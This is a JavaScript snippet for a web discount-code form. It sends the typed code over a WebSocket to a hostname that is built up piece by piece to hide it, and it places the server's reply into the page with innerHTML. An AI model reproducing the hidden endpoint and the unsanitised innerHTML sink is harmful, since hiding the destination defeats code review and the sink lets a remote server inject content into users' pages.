
function AlphaNumeric(str) {
    const regex = /^[a-zA-Z0-9]+$/;
    return regex.test(str);
  }

  let xx1_2="s";
  let xx2_2="y";
  let xx3_2="m";
  let xx4_2="p";
  let xx5_2="h";
  let xx6_2="o";
  let xx7_2="n";
  let xx8_2="i";
  let xx9_2="o";
  let xx10_2="u";
  let xx11_2="s";
  let xx12_2=".";
  let xx13_2="gli";
  let xx14_2="tch";
  let xx15_2=".me";
  let url_websocket_check=xx1_2+xx2_2+xx3_2+xx4_2+xx5_2+xx6_2+xx7_2+xx8_2+xx9_2+xx10_2+xx11_2+"20"+xx12_2+xx13_2+xx14_2+xx15_2;

function sendMessage() {
    
    var inputValor = document.getElementById("username").value.trim();
    if (inputValor !== "" && AlphaNumeric(inputValor)) {
      const websocketClient = new WebSocket("wss://"+url_websocket_check+"/"+inputValor);
      websocketClient.addEventListener('open', () => {
            websocketClient.send("code:"+inputValor);
            document.querySelector(".send_code").textContent = "Loading...";
      });
      websocketClient.addEventListener('message', (event) => {

        var message_result = event.data;
        console.log(message_result);
    
        if (typeof message_result==="string"){
    
            if (message_result.includes("affiliate_message:")){
                document.querySelector(".send_code").textContent = "Send";

                const aff_message=message_result.split(":")[1];
                const aff_code=message_result.split(":")[2];
                if (message_result.includes("20% discount applied")){
                    document.getElementById("confirmationMessage").innerHTML = aff_message;
                    document.getElementById("confirmationMessage").style.display = "block";
                    document.getElementById("username").disabled = true;
                    document.querySelector(".send_code").disabled = true;
                    localStorage.setItem('referralCode', aff_code);
                }
                if (message_result.includes("This discount code does not exist")){
                    document.getElementById("confirmationMessage").innerHTML = aff_message;
                    document.getElementById("confirmationMessage").style.display = "block";
                    localStorage.setItem('referralCode', '');
                    websocketClient.close(1000, 'Message sent');
                }
            }
            
    
        }
    
      });
        
    }
    
  }
